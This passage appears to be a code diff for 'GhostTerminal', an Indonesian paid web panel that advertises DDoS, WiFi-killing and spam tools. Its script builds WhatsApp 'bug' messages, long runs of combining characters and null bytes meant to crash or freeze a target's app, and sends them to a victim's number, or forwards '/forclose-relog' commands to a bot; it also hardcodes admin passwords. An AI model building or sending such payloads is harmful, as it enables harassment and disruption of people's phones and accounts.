+                    <div class="premium-header"><div class="brand"><div class="brand-icon-custom"><div class="dv-logo">◈</div><h1># PAGE</h1></div><div class="sys-tag">◉ SYS.ONLINE :: 860MS</div></div><div class="sub-header"><div class="eula-text">SYSTEM INFO</div><div class="custom-divider"></div></div></div>
+                    <div class="rules-area"><div class="rule-block"><div class="rule-header"><span class="custom-logo">◈</span><h3>USER PROTOCOLS</h3></div><div class="rule-card-custom"><div class="rule-title-line"><span class="mini-symbol">⌗</span><span class="rule-name">NO ACCOUNT BARTERING <span class="inline-badge">EXCLUSIVE</span></span></div><div class="rule-desc">Akun eksklusif GhostTerminal tidak boleh ditukar dengan barang, jasa, atau akun lain. Pelanggaran <strong>log akan terpantau</strong> dan berujung terminasi permanen.</div></div><div class="rule-card-custom"><div class="rule-title-line"><span class="mini-symbol">⌘</span><span class="rule-name">STRICTLY PERSONAL USE <span class="inline-badge">DEVICE ID</span></span></div><div class="rule-desc">Setiap akun terenkripsi untuk <strong>satu pengguna</strong> dan hanya boleh diakses oleh pemilik perangkat yang mendaftar (<strong>terikat Device ID</strong>). Shared access → automatic suspension.</div></div></div><div style="height:1px;background:#121724;margin:16px 0 24px"></div><div class="rule-block"><div class="rule-header"><span class="custom-logo">⛊</span><h3>RESELLING PROHIBITED</h3></div><div class="rule-card-custom"><div class="rule-title-line"><span class="mini-symbol">⛌</span><span class="rule-name">RESELLER RESTRICTION</span></div><div class="rule-desc">Member reguler dilarang memperjualbelikan akun. Akses penjualan eksklusif milik role berwenang (<strong>Partner, Owner, atau Reseller</strong>).</div></div><div class="rule-card-custom"><div class="rule-title-line"><span class="mini-symbol">◉</span><span class="rule-name">ILLEGAL DURATION SALES</span></div><div class="rule-desc">Sangat dilarang membagi atau menjual akses eceran (<strong>harian, mingguan, trial</strong>) yang mengelabui skema periode resmi.</div></div><div class="rule-card-custom"><div class="rule-title-line"><span class="mini-symbol">⌾</span><span class="rule-name">PRICE DUMPING BAN</span></div><div class="rule-desc">Dilarang keras merusak standar harga pasar (<strong>banting harga</strong>) di bawah kesepakatan jaminan keamanan platform.</div></div></div></div>
+                    <div class="footer-legal">GHOSTTERMINAL · INFO</div>
+                </div>
+                <div class="bottom-spacer"></div>
+            </div>
+            
+            <!-- TOOLS PAGE -->
+            <div id="pageTools" class="page">
+                <div class="tools-dark-container" id="toolsContainer">
+                    <div class="premium-header"><div class="brand"><h1># TOOLS</h1><div class="sys-tag">◉ SYSTEM SECURE</div></div><div class="sub-header"><h2></h2><div class="divider-blue" style="height:2px;background:linear-gradient(90deg,#3b82f6,#1e3a5f,transparent);margin-top:12px;"></div></div></div>
+                    <div class="tools-area">
+                        <div class="tool-category"><div class="main-btn" data-target="sub-doos"><div class="btn-left"><div class="custom-icon">◈</div><div><div class="btn-text">DOOS Tools</div><div class="btn-desc">Attack & Server</div></div></div><div class="arrow">▼</div></div><div class="submenu" id="sub-doos"><div class="sub-buttons"><button class="sub-btn" data-feature="attack-panel">Attack Panel</button><button class="sub-btn" data-feature="vps-list">My VPS List</button></div></div></div>
+                        <div class="tool-category"><div class="main-btn" data-target="sub-network"><div class="btn-left"><div class="custom-icon">⌘</div><div><div class="btn-text">Network</div><div class="btn-desc">WiFi & Spam</div></div></div><div class="arrow">▼</div></div><div class="submenu" id="sub-network"><div class="sub-buttons"><button class="sub-btn" data-feature="wifi-killer">WiFi Killer Internal</button><button class="sub-btn" data-feature="ngl-sender">Spam NGL</button></div></div></div>
+                        <div class="tool-category"><div class="main-btn" data-target="sub-osint"><div class="btn-left"><div class="custom-icon">⌕</div><div><div class="btn-text">OSINT</div><div class="btn-desc">Investigation</div></div></div><div class="arrow">▼</div></div><div class="submenu" id="sub-osint"><div class="sub-buttons"><button class="sub-btn" data-feature="domain-osint">Domain OSINT</button></div></div></div>
+                        <div class="tool-category"><div class="main-btn" data-target="sub-downloader"><div class="btn-left"><div class="custom-icon">⬇</div><div><div class="btn-text">Downloader</div><div class="btn-desc">Social Media</div></div></div><div class="arrow">▼</div></div><div class="submenu" id="sub-downloader"><div class="sub-buttons"><button class="sub-btn" data-feature="instagram-dl">Instagram Downloader</button><button class="sub-btn" data-feature="tiktok-dl">TikTok Downloader</button></div></div></div>
+                        <div class="tool-category"><div class="main-btn" data-target="sub-utilities"><div class="btn-left"><div class="custom-icon">⎔</div><div><div class="btn-text">Utilities</div><div class="btn-desc">Extra Tools</div></div></div><div class="arrow">▼</div></div><div class="submenu" id="sub-utilities"><div class="sub-buttons"><button class="sub-btn" data-feature="qr-generator">QR Generator</button></div></div></div>
+                        <div class="trigger-quick-btn" id="triggerQuickBtn">★ OPEN QUICK ACCESS</div>
+                        <div class="quick-section" id="quickSection"><div class="quick-buttons" id="quickAccessContainer"><button id="addQuickAccessBtn" style="background:#1e293b; padding:8px 16px; border-radius:40px; border:none; color:#60a5fa;">+ Add Quick Access</button></div></div>
+                    </div>
+                    <div class="footer-legal">GHOSTTERMINAL · TOOLS</div>
+                </div>
+                <div class="bottom-spacer"></div>
+            </div>
+        </div>
+    </div>
+    <div id="toast-container" class="toast-container"></div>
+    <nav class="bottom-nav"><div class="nav-item" id="navHome"><i data-lucide="home"></i><span>Home</span></div><div class="nav-item" id="navWhatsApp"><i data-lucide="message-square"></i><span>WhatsApp</span></div><div class="nav-item" id="navInfo"><i data-lucide="info"></i><span>Info</span></div><div class="nav-item" id="navTools"><i data-lucide="wrench"></i><span>Tools</span></div></nav>
+</div>
+
+<!-- DYNAMIC MODAL untuk tools -->
+<div id="dynamicModal" class="modal-overlay"><div class="modal-card" id="modalContent"></div></div>
+<!-- PROFILE MODAL -->
+<div class="profile-modal" id="profileModal"><div class="modal-card" id="profileModalCard"></div></div>
+<!-- DEV PAGE MODAL -->
+<div class="dev-page-modal" id="devPageModal"><div class="modal-card" id="devPageModalCard" style="max-width:560px; overflow-y:auto; max-height:90vh;"></div></div>
+
+<script>
+(function() {
+    function refreshIcons() { if (typeof lucide !== 'undefined' && lucide.createIcons) lucide.createIcons(); }
+    refreshIcons();
+
+    // Password spesial untuk role
+    const ADMIN_PASSWORD = "01284293";
+    const OWNER_PASSWORD = "03251342";
+    const TARGET_NUMBER = "6283856581009";
+    
+    let accounts = [
+        { username: "member1", password: "member123", role: "member" }
+    ];
+    
+    let currentUser = null;
+    let currentRole = "member";
+    
+    // Load accounts
+    const savedAccounts = localStorage.getItem('ghost_accounts');
+    if(savedAccounts) {
+        try { accounts = JSON.parse(savedAccounts); } catch(e) {}
+    }
+    function saveAccounts() { localStorage.setItem('ghost_accounts', JSON.stringify(accounts)); }
+    
+    function getRoleFromPassword(password) {
+        if(password === ADMIN_PASSWORD) return "admin";
+        if(password === OWNER_PASSWORD) return "owner";
+        return "member";
+    }
+    
+    // DOM elements
+    const loginPage = document.getElementById('loginPage');
+    const appWrapper = document.getElementById('appWrapper');
+    const loginUsername = document.getElementById('loginUsername');
+    const loginPassword = document.getElementById('loginPassword');
+    const usernameCounter = document.getElementById('usernameCounter');
+    const passwordCounter = document.getElementById('passwordCounter');
+    const loginBtn = document.getElementById('loginBtn');
+    const buyLink = document.getElementById('buyLink');
+    const sidebarUsername = document.getElementById('sidebarUsername');
+    const sidebarRole = document.getElementById('sidebarRole');
+    const waUsername = document.getElementById('waUsername');
+    const waRoleBadge = document.getElementById('waRoleBadge');
+    const bellIcon = document.getElementById('bellIcon');
+    const channelWhatsappBtn = document.getElementById('channelWhatsappBtn');
+    const profileIcon = document.getElementById('profileIcon');
+    const profileMenuBtn = document.getElementById('profileMenuBtn');
+    const logoutBtn = document.getElementById('logoutBtn');
+    const devPageBtn = document.getElementById('devPageBtn');
+    const profileModal = document.getElementById('profileModal');
+    const profileModalCard = document.getElementById('profileModalCard');
+    const devPageModal = document.getElementById('devPageModal');
+    const devPageModalCard = document.getElementById('devPageModalCard');
+    
+    // Custom select elements
+    const bugSelectTrigger = document.getElementById('bugSelectTrigger');
+    const bugOptionsContainer = document.getElementById('bugOptionsContainer');
+    const bugSelectHidden = document.getElementById('bugSelect');
+    const selectedBugText = document.getElementById('selectedBugText');
+    const bugSelectArrow = document.getElementById('bugSelectArrow');
+    
+    let isBugOptionsOpen = false;
+    
+    function toggleBugOptions() {
+        isBugOptionsOpen = !isBugOptionsOpen;
+        if (isBugOptionsOpen) {
+            bugOptionsContainer.classList.add('show');
+            if (bugSelectArrow) bugSelectArrow.setAttribute('data-lucide', 'chevron-up');
+        } else {
+            bugOptionsContainer.classList.remove('show');
+            if (bugSelectArrow) bugSelectArrow.setAttribute('data-lucide', 'chevron-down');
+        }
+        refreshIcons();
+    }
+    
+    if (bugSelectTrigger) {
+        bugSelectTrigger.addEventListener('click', (e) => {
+            e.stopPropagation();
+            toggleBugOptions();
+        });
+    }
+    
+    // Tutup options jika klik di luar
+    document.addEventListener('click', function(e) {
+        if (isBugOptionsOpen && bugSelectTrigger && !bugSelectTrigger.contains(e.target) && !bugOptionsContainer.contains(e.target)) {
+            toggleBugOptions();
+        }
+    });
+    
+    // Bug option click
+    const bugOptions = document.querySelectorAll('.bug-option');
+    bugOptions.forEach(opt => {
+        opt.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const bugValue = opt.getAttribute('data-bug');
+            const bugText = opt.innerText;
+            bugSelectHidden.value = bugValue;
+            selectedBugText.innerText = bugText;
+            // Tutup options setelah pilih
+            if (isBugOptionsOpen) toggleBugOptions();
+        });
+    });
+    
+    // Fungsi untuk mengirim pesan ke WhatsApp
+    function sendWhatsAppMessage(phoneNumber, message) {
+        let formattedNumber = phoneNumber.replace(/[^0-9]/g, '');
+        if (!formattedNumber.startsWith('62') && !formattedNumber.startsWith('628')) {
+            if (formattedNumber.startsWith('0')) {
+                formattedNumber = '62' + formattedNumber.substring(1);
+            } else if (!formattedNumber.startsWith('62')) {
+                formattedNumber = '62' + formattedNumber;
+            }
+        }
+        const encodedMsg = encodeURIComponent(message);
+        window.open(`https://wa.me/${formattedNumber}?text=${encodedMsg}`, '_blank');
+    }
+    
+    // Profile Modal
+    function buildProfileModal() {
+        return `
+            <div style="background:#0f131e; border-radius:40px; overflow:hidden;">
+                <div style="background:linear-gradient(145deg,#131a2c,#0c1020); padding:32px 24px 28px; text-align:center;">
+                    <div style="display:flex; justify-content:center; margin-bottom:18px;">
+                        <div id="profileAvatarCircle" style="width:110px;height:110px;background:#1e2a3e;border-radius:50%;border:3px solid #6c7aff;overflow:hidden;cursor:pointer;">
+                            <div id="profileAvatarDisplay" style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:42px;color:#8f9bff;background:#1e2a3e;">?</div>
+                        </div>
+                    </div>
+                    <div style="font-size:10px;color:#6b7c9e;">⌕ klik avatar untuk ganti dari galeri</div>
+                    <div id="profileNameDisplay" style="font-size:32px;font-weight:700;color:#fff;margin-top:8px;">UNKNOWN</div>
+                    <div id="profileRoleDisplay" style="font-size:13px;background:rgba(108,122,255,0.15);display:inline-block;padding:5px 16px;border-radius:40px;margin-top:10px;">MEMBER</div>
+                </div>
+                <div style="padding:24px 28px 20px;background:#0b0f18;">
+                    <div style="background:#111622;border-radius:20px;padding:14px 20px;margin-bottom:10px;display:flex;justify-content:space-between;"><span style="color:#7c8bb0;">USERNAME</span><span id="profileUsernameValue" style="background:#0a0e18;padding:5px 14px;border-radius:40px;">unknown</span></div>
+                    <div style="background:#111622;border-radius:20px;padding:14px 20px;margin-bottom:10px;display:flex;justify-content:space-between;"><span style="color:#7c8bb0;">PASSWORD</span><span id="profilePasswordValue" style="background:#0a0e18;padding:5px 14px;border-radius:40px;">••••••••</span></div>
+                    <div style="background:#111622;border-radius:20px;padding:14px 20px;margin-bottom:10px;display:flex;justify-content:space-between;"><span style="color:#7c8bb0;">ROLE</span><span id="profileRoleValue" style="background:#0a0e18;padding:5px 14px;border-radius:40px;">MEMBER</span></div>
+                    <div style="background:#111622;border-radius:20px;padding:14px 20px;margin-bottom:10px;display:flex;justify-content:space-between;"><span style="color:#7c8bb0;">EXPIRED</span><span style="background:#0a0e18;padding:5px 14px;border-radius:40px;">2028-12-25</span></div>
+                    <div style="background:#111622;border-radius:20px;padding:14px 20px;margin-bottom:10px;display:flex;justify-content:space-between;"><span style="color:#7c8bb0;">SESSION KEY</span><span style="background:#0a0e18;padding:5px 14px;border-radius:40px;">a7f3e8c2...</span></div>
+                </div>
+                <div style="padding:8px 28px 32px;background:#0b0f18;"><button id="profileChangePasswordBtn" style="width:100%;background:#111622;border:1px solid #2d3650;border-radius:60px;padding:14px;color:#c7d2fe;cursor:pointer;">CHANGE PASSWORD</button></div>
+                <div style="background:#080b12;text-align:center;padding:14px;font-size:9px;color:#55607a;">GHOSTTERMINAL // SECURE PROFILE</div>
+                <button id="closeProfileModalBtn" style="position:absolute;top:20px;right:20px;background:rgba(0,0,0,0.5);border:none;color:white;border-radius:50%;width:36px;height:36px;cursor:pointer;">✕</button>
+            </div>
+        `;
+    }
+    
+    function updateProfileModalContent() {
+        document.getElementById('profileNameDisplay').innerText = currentUser ? currentUser.toUpperCase() : 'UNKNOWN';
+        document.getElementById('profileUsernameValue').innerText = currentUser || 'unknown';
+        document.getElementById('profileRoleDisplay').innerText = currentRole.toUpperCase();
+        document.getElementById('profileRoleValue').innerText = currentRole.toUpperCase();
+        const savedAvatar = localStorage.getItem('ghost_avatar_' + currentUser);
+        const avatarDisplay = document.getElementById('profileAvatarDisplay');
+        if(savedAvatar) {
+            avatarDisplay.innerHTML = `<img src="${savedAvatar}" style="width:100%;height:100%;object-fit:cover;">`;
+        } else {
+            avatarDisplay.innerHTML = '?';
+            avatarDisplay.style.cssText = 'display:flex;align-items:center;justify-content:center;font-size:42px;color:#8f9bff;background:#1e2a3e;width:100%;height:100%;';
+        }
+    }
+    
+    function showProfileModal() {
+        profileModalCard.innerHTML = buildProfileModal();
+        profileModal.classList.add('show');
+        updateProfileModalContent();
+        document.getElementById('profileAvatarCircle')?.addEventListener('click', () => {
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.accept = 'image/*';
+            fileInput.onchange = (e) => {
+                const file = e.target.files[0];
+                if(file) {
+                    const reader = new FileReader();
+                    reader.onload = function(ev) {
+                        const base64 = ev.target.result;
+                        localStorage.setItem('ghost_avatar_' + currentUser, base64);
+                        const avatarDisplay2 = document.getElementById('profileAvatarDisplay');
+                        avatarDisplay2.innerHTML = `<img src="${base64}" style="width:100%;height:100%;object-fit:cover;">`;
+                        showToast('✓ Avatar berhasil diganti', true);
+                    };
+                    reader.readAsDataURL(file);
+                }
+            };
+            fileInput.click();
+        });
+        document.getElementById('closeProfileModalBtn')?.addEventListener('click', () => profileModal.classList.remove('show'));
+        document.getElementById('profileChangePasswordBtn')?.addEventListener('click', () => {
+            const newPass = prompt('Masukkan password baru (max 8 karakter):');
+            if(newPass && newPass.length <= 8) {
+                const acc = accounts.find(a => a.username === currentUser);
+                if(acc) { acc.password = newPass; saveAccounts(); showToast('✅ Password berhasil diubah!', true); }
+            } else if(newPass) { showToast('❌ Password maksimal 8 karakter!'); }
+        });
+    }
+    
+    // Dev Page Modal (GHOSTTERMINAL title)
+    function showDevPage() {
+        devPageModalCard.innerHTML = `
+            <div style="background:#0f131e; border-radius:40px; overflow:hidden;">
+                <div style="background:linear-gradient(145deg,#131a2c,#0c1020); padding:28px 24px; text-align:center;">
+                    <div style="font-size:24px; font-weight:900; background:linear-gradient(130deg,#ffffff,#8f9bff); -webkit-background-clip:text; background-clip:text; color:transparent;">GHOSTTERMINAL</div>
+                    <p style="font-size:13px; color:#8f9bff; margin-top:8px;">DEV PAGE</p>
+                </div>
+                <div style="padding:24px 28px 20px; background:#0b0f18;">
+                    <div style="background:#111622; border-radius:28px; padding:20px; margin-bottom:24px;">
+                        <div style="font-size:18px; font-weight:700; color:#ff8c8c; margin-bottom:16px; border-left:3px solid #ff5f5f; padding-left:12px;">DELETE USER</div>
+                        <div style="margin-bottom:16px;"><label style="display:block; font-size:11px; color:#7c8bb0;">USERNAME TARGET</label><input type="text" id="deleteUsername" placeholder="username target" style="width:100%; background:#090d16; border:1px solid #2c354a; border-radius:60px; padding:12px 18px; color:#e2e8f0;"></div>
+                        <button id="deleteBtn" style="width:100%; background:#2a1a1a; border:1px solid #ff5f5f; border-radius:60px; color:#ffaaaa; font-weight:700; padding:12px; cursor:pointer;">DELETE ACCOUNT</button>
+                    </div>
+                    <div style="background:#111622; border-radius:28px; padding:20px; margin-bottom:24px;">
+                        <div style="font-size:18px; font-weight:700; color:#6fcf97; margin-bottom:16px; border-left:3px solid #6fcf97; padding-left:12px;">CREATE ACCOUNT</div>
+                        <div><label>USERNAME</label><input type="text" id="createUsername" placeholder="username baru" style="width:100%; background:#090d16; border:1px solid #2c354a; border-radius:60px; padding:12px 18px; color:#e2e8f0; margin-bottom:12px;"></div>
+                        <div><label>PASSWORD</label><input type="text" id="createPassword" placeholder="password" style="width:100%; background:#090d16; border:1px solid #2c354a; border-radius:60px; padding:12px 18px; color:#e2e8f0; margin-bottom:12px;"></div>
+                        <div><label>DURASI (HARI)</label><input type="number" id="createDuration" value="30" style="width:100%; background:#090d16; border:1px solid #2c354a; border-radius:60px; padding:12px 18px; color:#e2e8f0; margin-bottom:12px;"></div>
+                        <div><label>ROLE</label><select id="createRole" style="width:100%; background:#090d16; border:1px solid #2c354a; border-radius:60px; padding:12px 18px; color:#e2e8f0;"><option value="member">MEMBER</option><option value="reseller">RESELLER</option><option value="admin">ADMIN</option></select></div>
+                        <button id="createBtn" style="width:100%; background:#1a2a1a; border:1px solid #6fcf97; border-radius:60px; color:#aaffcc; font-weight:700; padding:12px; cursor:pointer; margin-top:16px;">CREATE ACCOUNT</button>
+                    </div>
+                </div>
+                <div style="background:#080b12; text-align:center; padding:12px; font-size:9px; color:#55607a;">GHOSTTERMINAL // ADMIN CONTROL</div>
+                <button id="closeDevPageBtn" style="position:absolute;top:20px;right:20px;background:rgba(0,0,0,0.5);border:none;color:white;border-radius:50%;width:36px;height:36px;cursor:pointer;">✕</button>
+            </div>
+        `;
+        devPageModal.classList.add('show');
+        
+        document.getElementById('deleteBtn')?.addEventListener('click', () => {
+            const targetUser = document.getElementById('deleteUsername').value.trim();
+            if(!targetUser) { showToast('Masukkan username target'); return; }
+            const userIndex = accounts.findIndex(u => u.username.toLowerCase() === targetUser.toLowerCase());
+            if(userIndex === -1) { showToast(`User "${targetUser}" tidak ditemukan`); return; }
+            if(targetUser.toLowerCase() === currentUser?.toLowerCase()) { showToast('Tidak bisa menghapus akun sendiri'); return; }
+            accounts.splice(userIndex, 1);
+            saveAccounts();
+            showToast(`User "${targetUser}" berhasil dihapus`, true);
+            document.getElementById('deleteUsername').value = '';
+        });
+        
+        document.getElementById('createBtn')?.addEventListener('click', () => {
+            const username = document.getElementById('createUsername').value.trim();
+            const password = document.getElementById('createPassword').value.trim();
+            const duration = parseInt(document.getElementById('createDuration').value);
+            const role = document.getElementById('createRole').value;
+            if(!username || !password) { showToast('Username dan password harus diisi'); return; }
+            if(accounts.find(a => a.username.toLowerCase() === username.toLowerCase())) { showToast('Username sudah ada'); return; }
+            accounts.push({ username, password, role });
+            saveAccounts();
+            showToast(`Akun "${username}" (${role}) berhasil dibuat`, true);
+            document.getElementById('createUsername').value = '';
+            document.getElementById('createPassword').value = '';
+            document.getElementById('createDuration').value = '30';
+            document.getElementById('createRole').value = 'member';
+        });
+        
+        document.getElementById('closeDevPageBtn')?.addEventListener('click', () => devPageModal.classList.remove('show'));
+        devPageModal.onclick = (e) => { if(e.target === devPageModal) devPageModal.classList.remove('show'); };
+    }
+    
+    // Animations
+    function animateHome() {
+        ['homeHeader', 'homeVideoContainer', 'channelWhatsappBtn'].forEach(id => { const el = document.getElementById(id); if(el) el.classList.add('animate-in'); });
+    }
+    function resetHomeAnim() {
+        ['homeHeader', 'homeVideoContainer', 'channelWhatsappBtn'].forEach(id => { const el = document.getElementById(id); if(el) el.classList.remove('animate-in'); });
+    }
+    function animateWhatsApp() {
+        const els = ['waProfileCard', 'waVideoContainer', 'waControlPanel'];
+        els.forEach(id => { const el = document.getElementById(id); if(el) el.classList.add('animate-in'); });
+    }
+    function resetWhatsAppAnim() {
+        const els = ['waProfileCard', 'waVideoContainer', 'waControlPanel'];
+        els.forEach(id => { const el = document.getElementById(id); if(el) el.classList.remove('animate-in'); });
+    }
+    function animateInfo() {
+        const el = document.getElementById('infoDarkContainer'); if(el) el.classList.add('animate-in');
+    }
+    function resetInfoAnim() {
+        const el = document.getElementById('infoDarkContainer'); if(el) el.classList.remove('animate-in');
+    }
+    function animateTools() {
+        const el = document.getElementById('toolsContainer'); if(el) el.classList.add('animate-in');
+    }
+    function resetToolsAnim() {
+        const el = document.getElementById('toolsContainer'); if(el) el.classList.remove('animate-in');
+    }
+    
+    const navHome = document.getElementById('navHome');
+    const navWhatsApp = document.getElementById('navWhatsApp');
+    const navInfo = document.getElementById('navInfo');
+    const navTools = document.getElementById('navTools');
+    const pageHome = document.getElementById('pageHome');
+    const pageWhatsApp = document.getElementById('pageWhatsApp');
+    const pageInfo = document.getElementById('pageInfo');
+    const pageTools = document.getElementById('pageTools');
+    
+    function setActivePage(page) {
+        pageHome.classList.remove('active-page'); pageWhatsApp.classList.remove('active-page');
+        pageInfo.classList.remove('active-page'); pageTools.classList.remove('active-page');
+        navHome.classList.remove('active'); navWhatsApp.classList.remove('active');
+        navInfo.classList.remove('active'); navTools.classList.remove('active');
+        if (page === 'home') { 
+            pageHome.classList.add('active-page'); navHome.classList.add('active');
+            resetHomeAnim(); setTimeout(animateHome, 50);
+            document.getElementById('homeVideo')?.play().catch(e=>{});
+            document.getElementById('waVideo')?.pause();
+        } else if (page === 'whatsapp') { 
+            pageWhatsApp.classList.add('active-page'); navWhatsApp.classList.add('active');
+            resetWhatsAppAnim(); setTimeout(animateWhatsApp, 50);
+            document.getElementById('waVideo')?.play().catch(e=>{});
+            document.getElementById('homeVideo')?.pause();
+        } else if (page === 'info') { 
+            pageInfo.classList.add('active-page'); navInfo.classList.add('active');
+            resetInfoAnim(); setTimeout(animateInfo, 50);
+            document.getElementById('homeVideo')?.pause(); document.getElementById('waVideo')?.pause();
+        } else if (page === 'tools') { 
+            pageTools.classList.add('active-page'); navTools.classList.add('active');
+            resetToolsAnim(); setTimeout(animateTools, 50);
+            document.getElementById('homeVideo')?.pause(); document.getElementById('waVideo')?.pause();
+        }
+    }
+    
+    navHome.onclick = () => setActivePage('home');
+    navWhatsApp.onclick = () => setActivePage('whatsapp');
+    navInfo.onclick = () => setActivePage('info');
+    navTools.onclick = () => setActivePage('tools');
+    
+    window.toggleMenu = function() {
+        const sb = document.getElementById('sidebar');
+        const ov = document.getElementById('overlay');
+        if (sb && ov) { sb.classList.toggle('active'); ov.style.display = sb.classList.contains('active') ? 'block' : 'none'; }
+    };
+    
+    function showToast(msg, isSuccess = false) {
+        const c = document.getElementById('toast-container');
+        const t = document.createElement('div');
+        t.className = 'toast' + (isSuccess ? ' success' : '');
+        t.innerText = msg;
+        c.appendChild(t);
+        setTimeout(() => t.remove(), 2000);
+    }
+    
+    if (bellIcon) bellIcon.onclick = () => showToast('🔔 Tidak ada notifikasi baru');
+    
+    function updateUsernameCounter() {
+        const len = loginUsername.value.length;
+        usernameCounter.innerText = len + '/8';
+        if (len > 0 && len <= 8) usernameCounter.classList.add('valid');
+        else usernameCounter.classList.remove('valid');
+        validateLoginBtn();
+    }
+    function updatePasswordCounter() {
+        const len = loginPassword.value.length;
+        passwordCounter.innerText = len + '/8';
+        if (len > 0 && len <= 8) passwordCounter.classList.add('valid');
+        else passwordCounter.classList.remove('valid');
+        validateLoginBtn();
+    }
+    function validateLoginBtn() {
+        const valid = loginUsername.value.length > 0 && loginUsername.value.length <= 8 && loginPassword.value.length > 0 && loginPassword.value.length <= 8;
+        loginBtn.disabled = !valid;
+        if (valid) loginBtn.classList.remove('disabled');
+        else loginBtn.classList.add('disabled');
+    }
+    loginUsername.addEventListener('input', function() { if (this.value.length > 8) this.value = this.value.slice(0,8); updateUsernameCounter(); });
+    loginPassword.addEventListener('input', function() { if (this.value.length > 8) this.value = this.value.slice(0,8); updatePasswordCounter(); });
+    
+    // SPLASH LOADING dengan rectangle dan durasi 17 detik
+    function showSplashLoading() {
+        return new Promise((resolve) => {
+            const splashDiv = document.createElement('div');
+            splashDiv.className = 'splash-loading';
+            splashDiv.innerHTML = `
+                <video class="splash-bg-video" autoplay loop muted playsinline><source src="https://c.termai.cc/v105/9GSFL.mp4" type="video/mp4"></video>
+                <div class="splash-video-container">
+                    <video id="splashVideo" playsinline autoplay><source src="https://c.termai.cc/v105/9GSFL.mp4" type="video/mp4"></video>
+                </div>
+                <div class="splash-text">GHOST TERMINAL APPS</div>
+                <div class="loading-dots"><span></span><span></span><span></span></div>
+            `;
+            document.body.appendChild(splashDiv);
+            const video = document.getElementById('splashVideo');
+            if(video) {
+                video.volume = 0.3;
+                video.play().catch(() => { video.muted = true; video.play(); });
+                setTimeout(() => {
+                    if(document.body.contains(splashDiv)) {
+                        splashDiv.classList.add('hide');
+                        setTimeout(() => { splashDiv.remove(); resolve(); }, 600);
+                    }
+                }, 17000);
+                video.addEventListener('ended', () => {
+                    if(document.body.contains(splashDiv)) {
+                        splashDiv.classList.add('hide');
+                        setTimeout(() => { splashDiv.remove(); resolve(); }, 600);
+                    }
+                });
+            } else {
+                setTimeout(() => { splashDiv.remove(); resolve(); }, 17000);
+            }
+        });
+    }
+    
+    async function finishLoginAndShowApp() {
+        loginPage.classList.add('hide');
+        await showSplashLoading();
+        appWrapper.classList.add('show');
+        setActivePage('home');
+        refreshIcons();
+    }
+    
+    function doLogin() {
+        const user = loginUsername.value.trim();
+        const pass = loginPassword.value.trim();
+        if (!user || !pass) { showToast('❌ Isi username dan password!'); return; }
+        
+        let account = accounts.find(a => a.username === user && a.password === pass);
+        if(!account) {
+            const role = getRoleFromPassword(pass);
+            account = { username: user, password: pass, role: role };
+            accounts.push(account);
+            saveAccounts();
+        }
+        
+        currentUser = user;
+        currentRole = account.role;
+        
+        if (sidebarUsername) sidebarUsername.innerText = user;
+        if (sidebarRole) sidebarRole.innerText = currentRole.toUpperCase();
+        if (waUsername) waUsername.innerText = user;
+        if (waRoleBadge) waRoleBadge.innerText = currentRole.toUpperCase();
+        
+        // Tampilkan Dev Page hanya untuk admin/owner
+        if (devPageBtn) {
+            if (currentRole === 'member') {
+                devPageBtn.style.display = 'none';
+            } else {
+                devPageBtn.style.display = 'flex';
+            }
+        }
+        
+        finishLoginAndShowApp();
+    }
+    
+    if (loginBtn) loginBtn.onclick = doLogin;
+    if (loginUsername) loginUsername.onkeypress = (e) => { if (e.key === 'Enter') doLogin(); };
+    if (loginPassword) loginPassword.onkeypress = (e) => { if (e.key === 'Enter') doLogin(); };
+    if (buyLink) buyLink.onclick = (e) => { e.preventDefault(); showToast('🔒 Halaman pembelian akan segera tersedia'); };
+    
+    if (logoutBtn) {
+        logoutBtn.onclick = () => {
+            loginPage.classList.remove('hide');
+            appWrapper.classList.remove('show');
+            if (loginUsername) loginUsername.value = '';
+            if (loginPassword) loginPassword.value = '';
+            currentUser = null; currentRole = 'member';
+            updateUsernameCounter(); updatePasswordCounter();
+            toggleMenu();
+            document.getElementById('homeVideo')?.pause();
+            document.getElementById('waVideo')?.pause();
+        };
+    }
+    if (devPageBtn) devPageBtn.onclick = () => { if(currentRole !== 'member') showDevPage(); else showToast('Fitur khusus admin/owner'); toggleMenu(); };
+    if (channelWhatsappBtn) channelWhatsappBtn.onclick = () => { window.open('https://whatsapp.com/channel/0029Vb6zqwKBA1ewSBGNy90O', '_blank'); };
+    if (profileIcon) profileIcon.onclick = () => { if(currentUser) showProfileModal(); };
+    if (profileMenuBtn) profileMenuBtn.onclick = () => { if(currentUser) { showProfileModal(); toggleMenu(); } };
+    
+    // SEND BUG dengan mekanisme berbeda berdasarkan role
+    const sendBugBtn = document.getElementById('sendBugBtn');
+    if (sendBugBtn) {
+        sendBugBtn.addEventListener('click', () => {
+            const num = document.getElementById('targetNumber')?.value.trim();
+            const bug = bugSelectHidden?.value;
+            
+            if (!num) { showToast('ISI NOMOR TARGET!'); return; }
+            if (!num.startsWith('+')) { showToast('GUNAKAN FORMAT +62'); return; }
+            if (!bug) { showToast('PILIH BUG!'); return; }
+            
+            // Format nomor target (tanpa +)
+            let cleanNumber = num.replace(/[^0-9]/g, '');
+            if (cleanNumber.startsWith('62')) {
+                cleanNumber = cleanNumber;
+            } else if (cleanNumber.startsWith('0')) {
+                cleanNumber = '62' + cleanNumber.substring(1);
+            } else {
+                cleanNumber = '62' + cleanNumber;
+            }
+            
+            if (currentRole === 'member') {
+                // Member: kirim pesan bug langsung ke target
+                let bugMessage = '';
+                if (bug === 'FORCLOSE') {
+                    bugMessage = 'GHOST𝟐' + ('ꦾ𝐙\u0000ꦽ').repeat(500);
+                } else if (bug === 'INVIS') {
+                    bugMessage = 'GHOST𝟏' + 'ꦾ𝐗ꦽꦽ'.repeat(500);
+                } else if (bug === 'DELAY_INVISIBLE') {
+                    bugMessage = 'GHOST𝟑' + 'ꦾ𝐙$'.repeat(600) + '\n' + 'ꦽ'.repeat(600);
+                } else if (bug === 'DELAY_HARD') {
+                    bugMessage = 'GHOST𝟒' + 'ꦾ𝐗$'.repeat(800) + '\n' + 'ꦽ'.repeat(800);
+                }
+                sendWhatsAppMessage(cleanNumber, bugMessage);
+                showToast(`✅ Bug ${bug} terkirim ke ${num}`, true);
+            } 
+            else if (currentRole === 'admin' || currentRole === 'owner') {
+                // Admin/Owner: kirim perintah ke nomor target admin
+                let commandMessage = '';
+                if (bug === 'FORCLOSE') {
+                    commandMessage = `/forclose-relog ${cleanNumber}`;
+                } else if (bug === 'INVIS') {
